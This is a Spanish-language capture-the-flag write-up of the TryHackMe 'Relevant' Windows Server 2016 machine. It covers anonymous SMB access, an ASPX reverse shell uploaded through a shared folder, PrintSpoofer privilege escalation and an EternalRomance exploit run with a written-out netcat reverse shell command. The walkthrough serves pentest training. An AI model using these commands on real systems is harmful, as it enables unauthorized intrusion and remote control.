---
layout: single
title: Máquina Relevant - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "Acercándonos al final de este apartado del path, nos encontramos con dos máquinas desafío para poner en práctica todo lo aprendido hasta el momento. La primera es una máquina Windows que cuenta con dos vías de acceso, y será nuestro deber como pentesters descubrir todas sus vulnerabilidades."
date: 2022-07-09
classes: wide
header:
  teaser: /assets/images/relevant/portada.jpg
  teaser_home_page: true
categories:
  - Comunidad
  - Blog
  - Writeup
tags:
  - smb
  - base64
  - http
  - aspx
  - server 2016
  - printspoofer
  - eternalromance
---

# Introducción
La máquina se encuentra en [TryHackMe](https://tryhackme.com/room/overpass2hacked). Se trata de una máquina challenge, donde se nos plantea un escenario realista de un ambiente de pruebas, el cual requiere de un análisis de vulnerabilidades previo a su lanzamiento al público. No se nos proporciona mayor información, dado que es una prueba de tipo black box, solo que debemos obtener las dos flags, tanto de user como de root para completar el desafío.

# Reconocimiento
Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap -p- --open -T5 -Pn -n 10.10.187.76 -oG allPorts

![1]

Vemos que hay varios puertos habilitados, entre ellos el HTTP (80), el RDP (135), smb (139 y 445) y otros de carácter desconocido de momento.

Si realizamos un escaneo exhaustivo en busca de más información sobre estos puertos, la consulta no nos devolverá mayor información relevante:

    nmap -sC -sV -p80,135,139,445,3389,5985,49663,49667, 49669 10.10.187.76 -oN targeted

![2]

Este escaneo nos dice que dos puertos (5985 y 49663) son servicios HTTP adicionales.

# Servicio SMB
Si intentamos enumerar las carpetas compartidas a nivel de red sin autenticarnos (no tenemos credenciales), vemos que podemos acceder a una carpeta llamada: *nt4wrksv*.

    smbclient -L 10.10.187.76 -N

![3]

Dentro de esta carpeta encontraremos un archivo llamado: *passwords.txt*

![4]

Para descargarlo a nuestra máquina, solo debemos solicitarlo con el comando **get**:

    get passwords.txt

Dentro de este archivo veremos un par de cadenas encodeadas en lo que parece ser *base64*:

![5]

Para comprobarlo, las decodificamos con la herramienta de Linux **base64**:

    echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d;echo

Nota: El **echo** del final se emplea dado que la cadena resultante no contiene salto de línea al final, quedando el prompt de Linux pegado a esta. Puedes corroborarlo eliminando dicho comando.

![6]

Al descifrar ambas cadenas, nos encontramos con un par de credenciales que contienen tanto usuario como contraseña. De momento no nos son útiles, dado que no tenemos servicios remotos a los cuales acceder o paneles de logueo; hay que seguir investigando.

# Servicio HTTP (o más bien, servicios)
Como pudimos apreciar en la etapa de reconocimiento, el servidor cuenta con tres servicios HTTP en los puertos 80, 5985 y 49663. Tanto el puerto 80 como el 49663 contienen un IIS de Windows corriendo por defecto. Sin embargo, el puerto 5985 muestra un mensaje de *Not found*. De momento, nos enfocaremos en los IIS.

Si intentamos fuzzear ambos endpoints, nos encontraremos con que *wfuzz* no es capaz de devolvernos algún subdirectorio válido (todos devuelven un status 400).

![7]

Al no tener un subdirectorio válido al cual dirigirnos, y con pocas opciones y pistas de la ruta a tomar, se me ocurrió intentar probar el subdirectorio *nt4wrksv* (sí, el mismo del servicio SMB), y para mi sorpresa, el directorio es válido en el puerto 49663 (nótese cómo devuelve un status 200):

![8]

Al existir este directorio, me pregunto si de alguna manera tanto el HTTP como el SMB están conectados, así que decido visitar el archivo de contraseñas que encontramos en el SMB en la etapa correspondiente y, para mi sorpresa, soy capaz de leerlo:

![9]

# Acceso al sistema
Esto me permite un acercamiento al sistema, ya que ahora cuento con una vía potencial por la cual subir una reverse shell y poder ganar el acceso inicial al servidor. Para comprobarlo, subo un archivo de prueba al SMB con el comando *put*:

    put prueba.txt

![10]

Veo que cuento con capacidad de escritura en la carpeta, por lo que ahora visito por medio del navegador dicho archivo para corroborar la capacidad de lectura igualmente:

![11]

Como podemos observar, soy capaz tanto de subir un archivo como de leerlo, por lo que no lo pienso más y decido subir una reverse shell. Recordemos que nos encontramos ante un IIS, por lo que la reverse shell que necesitamos subir al servidor es una con terminación **.aspx**.

Para ello, empleo la del siguiente repositorio: https://github.com/borjmz/aspx-reverse-shell

Lo único que requerimos es modificar la IP y puerto a donde se conectará la shell (nuestra IP y puerto de escucha en netcat).

![12]

Al subir el archivo y acceder a este por medio del navegador, ya con una consola en escucha con el netcat, soy capaz de obtener una cmd del sistema habiendo ganado acceso a este.

![13]

Las instrucciones del challenge nos indican que la localización de las flags es secreta, sin embargo, intentamos en las rutas por defecto de los CTF (Desktop de cada usuario), pudiendo visualizar la primera de ellas dentro del directorio de un usuario llamado **bob**:

![14]

# Escalada de privilegios
Iniciamos el escaneo en busca de vías potenciales para convertirnos en usuario administrador con un listado de los privilegios con los que contamos:

    whoami /priv

![15]

Vemos que nos encontramos nuevamente ante un caso de *SeImpersonatePrivilege*, y sabemos también que este se explota con un JuicyPotato; sin embargo, antes de continuar, intentaremos un escaneo con ayuda de *PowerUp.ps1* (dado que las instrucciones detallaban que había más de una ruta para comprometer el sistema).

![16]

Al ejecutarlo, podemos notar que este nos regresa tres vulnerabilidades a tomar en cuenta: la primera es el SeImpersonate que ya habíamos notado, y las siguientes dos (que en realidad son la misma) nos habla de un posible *Unquoted Service Path*.

Sin embargo, esta vulnerabilidad requeriría que, primero, tuviéramos permisos de escritura en C: (no hay otra posible ruta, ya que no hay más espacios en el path), cosa que no tenemos, y segundo, permisos de reiniciar el servicio, cosa que el mismo PowerUp nos indica que no tenemos.

Si esto no ha quedado claro, recomiendo revisar la máquina [Steel Mountain](https://blu3ming.github.io/maquina-steelmountain-walkthrough/) donde se da una explicación más detallada de esta vulnerabilidad.

# SeImpersonatePrivilege
Con este nuevo análisis, ahora sí nos disponemos a vulnerar este fallo de seguridad por medio de nuestra herramienta favorita: *JuicyPotato*. Para ello, movemos al sistema tanto este binario como el de netcat (nc.exe) para entablarnos una reverse shell.

![17]

Sin embargo ocurre algo; al querer ejecutarlo, el sistema nos indica que no ha sido capaz de encontrar el programa que estamos solicitando. Cuando hago un listado de los archivos existentes en la carpeta actual, me encuentro con que ha sido borrado. Inmediatamente pienso en una seguridad antivirus que lo detectó, pero para estar seguros, lo vuelvo a intentar un par de veces.

En algunas ejecuciones me aparecía el mismo mensaje de antes, pero en otras me aparecía lo siguiente:

![18]

Al parecer, Windows no podía ejecutar el *JuicyPotato*, si es que el antivirus no me lo borraba antes. Investigando más, y revisando las máquinas anteriores, me percato de que este programa no funciona en todas las versiones de Windows, y entonces me percato de que hasta este punto no me había preocupado por hacer una enumeración del sistema (versión del SO y arquitectura).

Listo los detalles del servidor:

    systeminfo

![19]

Es entonces donde me doy cuenta de mi error, el servidor corre un Windows Server 2016 de 64 bits. De acuerdo a mis investigaciones, y lo reportado en la máquina [Alfred](https://blu3ming.github.io/maquina-alfred-walkthrough), este sistema operativo no permite la escalada de privilegios por medio de *JuicyPotato* al no estar habilitado el DCOM por defecto en dicho SO.

Para este server, Server 2019 y algunas versiones de Windows 10, se recomienda el uso de [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/tree/master/PrintSpoofer). Debo admitir que nunca había escuchado hablar de dicha herramienta ni haberla empleado anteriormente; pero bueno, ya podemos agregarla a nuestro repertorio. De hecho, su uso es bastante cómodo y sencillo. Simplemente tenemos que decirle qué comando queremos ejecutar y, si se trata de una cmd o powershell, tenemos la opción de desplegarla inmediatamente sin necesidad de recurrir a reverse shells.

Es decir, al ejecutar el comando:

    PrintSpoofer.exe -i -c powershell

Le estamos indicando a la herramienta que queremos un modo interactivo (-i), es decir, que se despliegue en la misma consola inmediatamente, y que ejecute el comando (-c) powershell. Esto nos devolverá un prompt de powershell como el usuario administrador:

![20]

Así de fácil y sencillo nos hemos convertido en usuarios administradores, todavía explotando el SeImpersonatePrivilege.

Solo nos resta listar la flag correspondiente a este usuario para finalizar con la máquina.

![21]

# Segunda vía de acceso
Durante mi fase de reconocimiento por el servicio SMB no me podía sacar de la cabeza la posibilidad de que este servidor fuera vulnerable a EternalBlue (MS17-010). Esto deriva de las mismas instrucciones, donde detallan que hay más de una vía potencial para convertirse en usuarios administradores. Al momento de finalizar la máquina y percatarme de que (al menos en la vía descrita hasta este momento) no había más posibles vulnerabilidades que explotar, me decidí a intentar escanear nuevamente la máquina, pero ahora en busca de esta vulnerabilidad.

Para mi sorpresa, la máquina muestra signos de ser vulnerable a EternalBlue (olvidé tomar captura del escaneo con nmap). Sin embargo, en esta ocasión no podemos emplear lo aprendido en la máquina [Blue](https://blu3ming.github.io/maquina-blue-walkthrough/), ya que nos encontramos ante un Windows Server 2016.

Para este tipo de Sistema Operativo, existe **EternalRomance**, una variación del EternalBlue pero que se basa en la misma vulnerabilidad (MS17-010). Este puede descargarse desde su repositorio: https://github.com/hardcod3dd/ms17-toolkit/blob/master/eternalromance.py Se trata de un script programado en Python similar a los empleados en la máquina [Blue](https://blu3ming.github.io/maquina-blue-walkthrough/), con variaciones para el SO objetivo.

Al tratarse de una variación, este script requiere de un usuario y contraseña válidos en el sistema para poder acceder, al igual que un nombre de pipe válido (el cual obtiene de forma automática, por lo que no debemos preocuparnos por él).

Recordemos que ya habíamos sido capaces de obtener dos credenciales de usuario durante el escaneo del servicio SMB, por lo que probamos primero las del usuario *Bob*. Dado que su contraseña contiene caracteres especiales que entran en conflicto con la bash, se decidió hardcodearlas dentro del script en la línea 965:

![22]

Al momento de ejecutarlo, requerimos indicarle también el comando que llevará a cabo en el sistema destino; de momento, se le indicó que creara un archivo vacío en el Escritorio del usuario Bob:

    ython2 eternalromance.py 10.10.193.172 bob 123 "type null > c:\users\bob\desktop\pwned.txt"

![23]

Nota: Nótese cómo en el comando estamos mandando aún un usuario (bob) y contraseña (123). Estos pueden ser lo que sea, dado que ya hardcodeamos dichos valores en el código. Solo se envían porque el programa necesita dichos valores en la entrada (aunque después los ignore).

La salida muestra que el comando se ejecutó de manera exitosa, por lo que procedemos a verificarlo con la consola que aún conservamos del privesc anterior.

Nota: Esto solo es posible dado que anteriormente comprometimos la máquina por el otro método. De haber iniciado con este, no seríamos capaces de verificar si realmente el script está funcionando y hubiéramos tenido que intentar con nada más que fé en que funcionará, jaja.

![24]

Como podemos observar, al listar el contenido de la carpeta Desktop del usuario Bob, somos capaces de ver el archivo **pwned.txt** que mandamos a crear, por lo que parece ser que el script está funcionando correctamente. Ahora solo queda ejecutar un comando que nos permita acceder como administradores, y qué mejor que una reverse shell.

Para esto, requerimos de una forma para subir un netcat al servidor. Si nos ponemos en el escenario de primer acercamiento, es decir, no contamos aún con acceso al servidor, tendríamos que buscar la forma de subir un archivo de manera remota solo con lo que nos ofrece la máquina. Es aquí donde recordamos que podemos subir archivos al servicio SMB, por lo que primero localizamos la carpeta correspondiente en el sistema, encontrándose en:

    c:\inetpub\wwwroot\nt4wrksv

![25]

Ya localizada, subimos el netcat con el comando put:

    put nc.exe

![26]

Finalmente, volvemos a ejecutar el EternalRomance, pero ahora indicándole que ejecute el netcat que acabamos de subir y que entable una reverse shell con nosotros:

    python2 eternalromance.py 10.10.193.172 bob 123 "c:\inetpub\wwwroot\nt4wrksv\nc.exe -e cmd 10.10.15.193 443"

![27]

Para este momento, ya debemos tener una consola con el netcat en escucha por el puerto especificado. Vemos como al ejecutar el EternalRomance, este parece quedarse colgado un momento; esto es buena señal, y si nos dirigimos a la consola en escucha veremos que recibimos una shell como el usuario administrador:

![28]

Con esto hemos completado la máquina, habiéndola comprometido de dos formas diferentes.

[1]:/assets/images/relevant/1.png
[2]:/assets/images/relevant/2.png
[3]:/assets/images/relevant/3.png
[4]:/assets/images/relevant/4.png
[5]:/assets/images/relevant/5.png
[6]:/assets/images/relevant/6.png
[7]:/assets/images/relevant/7.png
[8]:/assets/images/relevant/8.png
[9]:/assets/images/relevant/9.png
[10]:/assets/images/relevant/10.png
[11]:/assets/images/relevant/11.png
[12]:/assets/images/relevant/12.png
[13]:/assets/images/relevant/13.png
[14]:/assets/images/relevant/14.png
[15]:/assets/images/relevant/15.png
[16]:/assets/images/relevant/16.png
[17]:/assets/images/relevant/17.png
[18]:/assets/images/relevant/18.png
[19]:/assets/images/relevant/19.png
[20]:/assets/images/relevant/20.png
[21]:/assets/images/relevant/21.png
[22]:/assets/images/relevant/22.png
[23]:/assets/images/relevant/23.png
[24]:/assets/images/relevant/24.png
[25]:/assets/images/relevant/25.png
[26]:/assets/images/relevant/26.png
[27]:/assets/images/relevant/27.png
[28]:/assets/images/relevant/28.png